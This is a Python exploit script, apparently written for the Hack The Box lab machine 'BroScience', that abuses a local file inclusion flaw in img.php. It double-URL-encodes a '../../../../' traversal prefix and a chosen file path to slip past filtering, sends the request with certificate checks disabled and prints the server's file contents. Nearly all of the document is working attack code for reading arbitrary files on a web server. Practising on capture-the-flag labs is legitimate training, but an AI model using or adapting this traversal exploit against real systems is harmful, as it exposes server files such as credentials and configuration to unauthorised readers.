#!/usr/bin/python3
# the following script (used for HTB machine called BroScience) is applied to a very specific case, however may be adapted to be retooled for a similiar situation
# scenario: we have discovered a web server (Apache on Debian) which includes web server files in /var/www/html/includes/*.php
# we have discovered a LFI vuln with browser + BURP where we need to double URL-encode each file we try.
# This script thus helps us end this GET request with a double-URL encoded path and display response
# )
import requests, sys, warnings

warnings.simplefilter("ignore")

if len(sys.argv) < 2:
    print(f"\n\033[1;37m[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <file>\n")
    exit(1)

def doubleurlencode(string):

    urlencode = ""

    for character in string:
        decimal = ord(character)
        urlencode += "%" + hex(decimal)[2:]

    double = ""

    for character in urlencode:
        decimal = ord(character)
        double += "%" + hex(decimal)[2:]

    return double

dpt = doubleurlencode("../../../../")
file = doubleurlencode(sys.argv[1])

target = "https://broscience.htb/includes/img.php?path="
request = requests.get(target + dpt + file, verify=False)
response = request.text

print(response.strip())